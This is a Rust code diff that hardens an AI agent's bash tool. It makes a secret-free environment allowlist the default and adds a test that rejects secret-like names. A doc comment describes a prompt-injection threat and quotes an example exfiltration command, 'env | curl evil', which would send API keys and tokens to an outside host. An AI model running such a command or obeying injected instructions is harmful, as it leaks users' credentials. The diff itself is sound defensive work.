@@ -99,13 +99,32 @@ pub fn normalize_path(path: &Path) -> PathBuf {
 }
 
 /// Controls which environment variables are visible to bash subprocesses.
-#[derive(Debug, Clone, Default)]
+///
+/// **BREAKING CHANGE (F-FS-2)**: the default is now `Allowlist(DAEMON_ENV_ALLOWLIST)`.
+/// Previously `Inherit` was the default — which passed all parent env vars
+/// (including `ANTHROPIC_API_KEY`, `AWS_*`, `GITHUB_TOKEN`, etc.) into bash.
+/// A single prompt-injection-driven `env | curl evil` call could exfiltrate
+/// every secret. Use `EnvPolicy::Inherit` explicitly (and document why) if
+/// you really want full inheritance.
+#[derive(Debug, Clone)]
 pub enum EnvPolicy {
-    /// Inherit all env vars from parent process (CLI default).
-    #[default]
+    /// Inherit ALL env vars from the parent process. Dangerous when the agent
+    /// can spawn shells under prompt-injection control. Opt-in only.
     Inherit,
-    /// Only pass explicitly allowlisted env vars.
+    /// Only pass explicitly allowlisted env vars. **Default** — populated with
+    /// [`DAEMON_ENV_ALLOWLIST`] which contains no secrets.
     Allowlist(Vec<String>),
+}
+
+impl Default for EnvPolicy {
+    fn default() -> Self {
+        Self::Allowlist(
+            DAEMON_ENV_ALLOWLIST
+                .iter()
+                .map(|s| (*s).to_string())
+                .collect(),
+        )
+    }
 }
 
 /// Safe default allowlist for daemon mode — no secrets, just system vars.
@@ -206,9 +225,32 @@ mod tests {
         assert!(normalized.starts_with("/"));
     }
 
+    /// SECURITY (F-FS-2): the default MUST be Allowlist (no secrets) rather
+    /// than Inherit. Previously the default was `Inherit`, which leaked
+    /// `ANTHROPIC_API_KEY` / `AWS_*` / etc. to LLM-controlled bash sessions.
     #[test]
-    fn env_policy_default_is_inherit() {
-        assert!(matches!(EnvPolicy::default(), EnvPolicy::Inherit));
+    fn env_policy_default_is_safe_allowlist() {
+        match EnvPolicy::default() {
+            EnvPolicy::Allowlist(list) => {
+                assert!(list.contains(&"PATH".to_string()));
+                // No KEY/TOKEN/SECRET names should be in the default.
+                let suspicious: Vec<&String> = list
+                    .iter()
+                    .filter(|n| {
+                        let u = n.to_ascii_uppercase();
+                        u.contains("KEY") || u.contains("TOKEN") || u.contains("SECRET")
+                    })
+                    .collect();
+                assert!(
+                    suspicious.is_empty(),
+                    "default allowlist must not contain secret-like names: {suspicious:?}"
+                );
+            }
+            EnvPolicy::Inherit => panic!(
+                "EnvPolicy::default() must NOT be Inherit (F-FS-2). \
+                 Use EnvPolicy::Inherit explicitly if you really want it."
+            ),
+        }
     }
 
     #[test]
